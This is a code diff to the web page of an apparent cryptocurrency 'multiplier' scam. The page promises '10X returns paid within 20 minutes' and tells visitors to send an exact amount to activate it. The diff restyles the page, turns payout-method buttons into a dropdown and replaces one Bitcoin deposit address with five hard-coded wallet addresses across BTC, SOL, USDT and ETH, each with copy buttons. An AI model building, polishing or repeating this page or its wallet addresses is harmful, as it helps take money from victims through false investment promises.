@@ -32,6 +32,9 @@
             min-height: 100vh;
             line-height: 1.6;
             overflow-x: hidden;
+            background-image: 
+                radial-gradient(circle at 25% 25%, rgba(110, 59, 255, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 75% 75%, rgba(0, 209, 255, 0.1) 0%, transparent 50%);
         }
 
         header {
@@ -211,17 +214,32 @@
             padding: 1.5rem;
             margin-bottom: 2rem;
             text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .retry-notice::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, transparent 65%, rgba(0, 209, 255, 0.05) 100%);
+            pointer-events: none;
         }
 
         .retry-notice h3 {
             color: var(--secondary);
             margin-top: 0;
             font-size: 1.2rem;
+            position: relative;
         }
 
         .retry-notice p {
             margin-bottom: 1rem;
             font-size: 0.95rem;
+            position: relative;
         }
 
         .multiplier-card {
@@ -271,6 +289,46 @@
             font-size: 0.95rem;
         }
 
+        .select-wrapper {
+            position: relative;
+            width: 100%;
+            margin-bottom: 1.5rem;
+        }
+
+        .select-wrapper::after {
+            content: '\f078';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            position: absolute;
+            top: 50%;
+            right: 15px;
+            transform: translateY(-50%);
+            color: var(--light);
+            pointer-events: none;
+            font-size: 0.8rem;
+        }
+
+        .payment-method-select {
+            width: 100%;
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(0, 209, 255, 0.2);
+            border-radius: 12px;
+            color: var(--light);
+            font-size: 1rem;
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .payment-method-select:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px var(--accent-glow);
+        }
+
         .dollar-input {
             position: relative;
             width: 100%;
@@ -307,39 +365,6 @@
             box-shadow: 0 0 0 3px var(--accent-glow);
         }
 
-        .account-credit {
-            margin-bottom: 1.5rem;
-        }
-
-        .payment-options {
-            display: flex;
-            gap: 0.5rem;
-            margin-bottom: 1rem;
-            flex-wrap: wrap;
-        }
-
-        .payment-option {
-            padding: 0.6rem 1rem;
-            border-radius: 8px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            color: var(--light);
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-size: 0.9rem;
-            user-select: none;
-        }
-
-        .payment-option:hover {
-            background: rgba(255, 255, 255, 0.1);
-        }
-
-        .payment-option.active {
-            background: rgba(110, 59, 255, 0.2);
-            border-color: var(--primary);
-        }
-
         .conditional-field {
             display: none;
             animation: fadeIn 0.4s;
@@ -354,6 +379,17 @@
             text-align: center;
             position: relative;
             overflow: hidden;
+        }
+
+        .calculator::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, transparent 65%, rgba(0, 209, 255, 0.05) 100%);
+            pointer-events: none;
         }
 
         .calculation {
@@ -457,6 +493,58 @@
         .copy-btn.copied {
             background: var(--accent);
             color: white;
+        }
+
+        .crypto-options {
+            margin-top: 1.5rem;
+        }
+
+        .crypto-option {
+            margin-bottom: 1rem;
+        }
+
+        .crypto-option h4 {
+            color: var(--secondary);
+            margin-bottom: 0.5rem;
+            font-size: 1rem;
+        }
+
+        .crypto-address {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px dashed rgba(0, 209, 255, 0.3);
+            border-radius: 8px;
+            padding: 0.8rem;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 0.9rem;
+            position: relative;
+            padding-right: 80px;
+        }
+
+        .crypto-copy-btn {
+            position: absolute;
+            right: 0;
+            top: 0;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: var(--light);
+            padding: 0 1rem;
+            border-radius: 0 8px 8px 0;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            border-left: 1px dashed rgba(0, 209, 255, 0.3);
+            font-size: 0.8rem;
+        }
+
+        .crypto-copy-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .crypto-copy-btn.copied {
+            background: var(--secondary);
+            color: var(--dark);
         }
 
         .timer {
@@ -563,16 +651,31 @@
             border: 1px solid rgba(0, 209, 255, 0.3);
             margin-top: 2rem;
             animation: fadeIn 0.6s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .success-message::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, transparent 65%, rgba(0, 209, 255, 0.05) 100%);
+            pointer-events: none;
         }
 
         .success-message h3 {
             color: var(--secondary);
             font-size: 1.5rem;
             margin-bottom: 1rem;
+            position: relative;
         }
 
         .success-message p {
             margin-bottom: 1.5rem;
+            position: relative;
         }
 
         .checkmark {
@@ -580,6 +683,7 @@
             color: var(--secondary);
             margin-bottom: 1rem;
             animation: bounceIn 0.6s;
+            position: relative;
         }
 
         @keyframes bounceIn {
@@ -594,11 +698,25 @@
             padding: 1.5rem;
             background: rgba(0, 0, 0, 0.2);
             border-radius: 12px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .partners-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, transparent 65%, rgba(0, 209, 255, 0.05) 100%);
+            pointer-events: none;
         }
 
         .partners-section h3 {
             color: var(--secondary);
             margin-bottom: 1.5rem;
+            position: relative;
         }
 
         .partners-logos {
@@ -630,12 +748,26 @@
             padding: 1.5rem;
             margin-bottom: 1rem;
             border: 1px solid rgba(0, 209, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .testimonial-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, transparent 65%, rgba(0, 209, 255, 0.05) 100%);
+            pointer-events: none;
         }
 
         .testimonial-header {
             display: flex;
             align-items: center;
             margin-bottom: 1rem;
+            position: relative;
         }
 
         .testimonial-avatar {
@@ -818,13 +950,14 @@
                 font-size: 0.8rem;
             }
 
-            .payment-options {
-                gap: 0.3rem;
-            }
-            
-            .payment-option {
-                padding: 0.5rem 0.8rem;
+            .crypto-address {
+                padding-right: 70px;
                 font-size: 0.8rem;
+            }
+
+            .crypto-copy-btn {
+                padding: 0 0.8rem;
+                font-size: 0.7rem;
             }
 
             .partners-logos {
@@ -889,15 +1022,15 @@
         <div class="multiplier-card">
             <div class="particles" id="particles"></div>
             
-            <div class="account-credit">
-                <label>Account to credit you after we multiply your crypto</label>
-                <div class="payment-options">
-                    <div class="payment-option active" data-method="crypto">Crypto Wallet</div>
-                    <div class="payment-option" data-method="paypal">PayPal</div>
-                    <div class="payment-option" data-method="cashapp">CashApp</div>
-                    <div class="payment-option" data-method="venmo">Venmo</div>
-                    <div class="payment-option" data-method="zelle">Zelle</div>
-                </div>
+            <div class="select-wrapper">
+                <label for="paymentMethod">Account to credit you after we multiply your crypto</label>
+                <select id="paymentMethod" class="payment-method-select">
+                    <option value="crypto">Crypto Wallet</option>
+                    <option value="paypal">PayPal</option>
+                    <option value="cashapp">CashApp</option>
+                    <option value="venmo">Venmo</option>
+                    <option value="zelle">Zelle</option>
+                </select>
             </div>
             
             <div class="input-group conditional-field" id="cryptoField">
@@ -954,14 +1087,50 @@
             </div>
 
             <div class="deposit-section" id="depositSection">
-                <h3>Send Payment to This Address (BTC)</h3>
-                <div class="deposit-address-container">
-                    <div class="deposit-address" id="depositAddress">
-                        bc1qwvfpz7udrrk07mlfuselk9lsvqkexlj8zst6v5
-                    </div>
-                    <button class="copy-btn" id="copyBtn">COPY</button>
-                </div>
+                <h3>Send Payment to One of These Addresses</h3>
                 <p>Send exactly $<span id="requiredAmount">0.00</span> to activate 10X multiplier</p>
+                
+                <div class="crypto-options">
+                    <div class="crypto-option">
+                        <h4>Bitcoin (BTC)</h4>
+                        <div class="crypto-address">
+                            bc1qwvfpz7udrrk07mlfuselk9lsvqkexlj8zst6v5
+                            <button class="crypto-copy-btn">COPY</button>
+                        </div>
+                    </div>
+                    
+                    <div class="crypto-option">
+                        <h4>Solana (SOL)</h4>
+                        <div class="crypto-address">
+                            GG5JKBh496pDdkDJzx8m1LvngMPdcWGD6qif77NyVJW4
+                            <button class="crypto-copy-btn">COPY</button>
+                        </div>
+                    </div>
+                    
+                    <div class="crypto-option">
+                        <h4>USDT (ERC20)</h4>
+                        <div class="crypto-address">
+                            0x21D5D6fDc227dC33AEEea9Aa4851f98eE7962869
+                            <button class="crypto-copy-btn">COPY</button>
+                        </div>
+                    </div>
+                    
+                    <div class="crypto-option">
+                        <h4>USDT (TRC20)</h4>
+                        <div class="crypto-address">
+                            TTSf6ca1dJ3vrwNPP2neA9bqf12tRzmoxj
+                            <button class="crypto-copy-btn">COPY</button>
+                        </div>
+                    </div>
+                    
+                    <div class="crypto-option">
+                        <h4>Ethereum (ETH)</h4>
+                        <div class="crypto-address">
+                            0x21D5D6fDc227dC33AEEea9Aa4851f98eE7962869
+                            <button class="crypto-copy-btn">COPY</button>
+                        </div>
+                    </div>
+                </div>
                 
                 <div class="timer" id="timer">
                     Your funds will be multiplied in: <span id="timeRemaining">20:00</span>
@@ -1091,7 +1260,7 @@
 
     <script>
         // Payment Method Selection
-        const paymentOptions = document.querySelectorAll('.payment-option');
+        const paymentMethodSelect = document.getElementById('paymentMethod');
         const cryptoField = document.getElementById('cryptoField');
         const paypalField = document.getElementById('paypalField');
         const cashappField = document.getElementById('cashappField');
@@ -1125,49 +1294,39 @@
             });
         }
 
-        paymentOptions.forEach(option => {
-            option.addEventListener('click', function(e) {
-                e.preventDefault();
-                
-                // Remove active class from all options
-                paymentOptions.forEach(opt => {
-                    opt.classList.remove('active');
-                });
-                
-                // Add active class to clicked option
-                this.classList.add('active');
-                currentMethod = this.dataset.method;
-                
-                // Hide all conditional fields
-                document.querySelectorAll('.conditional-field').forEach(field => {
-                    field.style.display = 'none';
-                });
-                
-                // Show the selected field
-                const fieldToShow = document.getElementById(`${currentMethod}Field`);
-                if (fieldToShow) {
-                    fieldToShow.style.display = 'block';
-                    // Focus the first input in the shown field
-                    const input = fieldToShow.querySelector('input');
-                    if (input) {
-                        input.focus();
-                    }
-                }
-                
-                // Clear any previous errors
-                clearAllErrors();
-                
-                // Update return message based on selected method
-                const messages = {
-                    'crypto': '*10X returns paid within 20 minutes to the provided wallet address',
-                    'paypal': '*10X returns paid within 20 minutes to your PayPal account',
-                    'cashapp': '*10X returns paid within 20 minutes to your CashApp account',
-                    'venmo': '*10X returns paid within 20 minutes to your Venmo account',
-                    'zelle': '*10X returns paid within 20 minutes to your Zelle account'
-                };
-                
-                returnMessage.textContent = messages[currentMethod] || '';
+        // Handle payment method selection change
+        paymentMethodSelect.addEventListener('change', function() {
+            currentMethod = this.value;
+            
+            // Hide all conditional fields
+            document.querySelectorAll('.conditional-field').forEach(field => {
+                field.style.display = 'none';
             });
+            
+            // Show the selected field
+            const fieldToShow = document.getElementById(`${currentMethod}Field`);
+            if (fieldToShow) {
+                fieldToShow.style.display = 'block';
+                // Focus the first input in the shown field
+                const input = fieldToShow.querySelector('input');
+                if (input) {
+                    input.focus();
+                }
+            }
+            
+            // Clear any previous errors
+            clearAllErrors();
+            
+            // Update return message based on selected method
+            const messages = {
+                'crypto': '*10X returns paid within 20 minutes to the provided wallet address',
+                'paypal': '*10X returns paid within 20 minutes to your PayPal account',
+                'cashapp': '*10X returns paid within 20 minutes to your CashApp account',
+                'venmo': '*10X returns paid within 20 minutes to your Venmo account',
+                'zelle': '*10X returns paid within 20 minutes to your Zelle account'
+            };
+            
+            returnMessage.textContent = messages[currentMethod] || '';
         });
 
         // Show crypto field by default
@@ -1190,6 +1349,24 @@
                     answer.classList.toggle('show');
                 });
             });
+
+            // Initialize crypto address copy buttons
+            document.querySelectorAll('.crypto-copy-btn').forEach(button => {
+                button.addEventListener('click', function() {
+                    const address = this.parentElement.textContent.replace('COPY', '').trim();
+                    navigator.clipboard.writeText(address).then(() => {
+                        this.textContent = 'COPIED!';
+                        this.classList.add('copied');
+                        
+                        setTimeout(() => {
+                            this.textContent = 'COPY';
+                            this.classList.remove('copied');
+                        }, 2000);
+                    }).catch(err => {
+                        console.error('Failed to copy text: ', err);
+                    });
+                });
+            });
         });
 
         // Get DOM elements
@@ -1198,14 +1375,12 @@
         const resultDisplay = document.getElementById('resultDisplay');
         const submitBtn = document.getElementById('submitBtn');
         const depositSection = document.getElementById('depositSection');
-        const depositAddress = document.getElementById('depositAddress');
         const requiredAmount = document.getElementById('requiredAmount');
         const timeRemaining = document.getElementById('timeRemaining');
         const statusMessage = document.getElementById('statusMessage');
         const successMessage = document.getElementById('successMessage');
         const successAmount = document.getElementById('successAmount');
         const newTransactionBtn = document.getElementById('newTransactionBtn');
-        const copyBtn = document.getElementById('copyBtn');
         const progressContainer = document.getElementById('progressContainer');
         const progressBar = document.getElementById('progressBar');
 
@@ -1488,21 +1663,6 @@
                     }, 1000);
                 }
             }, 30);
-        });
-
-        // Copy address button
-        copyBtn.addEventListener('click', function() {
-            navigator.clipboard.writeText(depositAddress.textContent.trim()).then(() => {
-                this.textContent = 'COPIED!';
-                this.classList.add('copied');
-                
-                setTimeout(() => {
-                    this.textContent = 'COPY';
-                    this.classList.remove('copied');
-                }, 2000);
-            }).catch(err => {
-                console.error('Failed to copy text: ', err);
-            });
         });
 
         // New transaction button
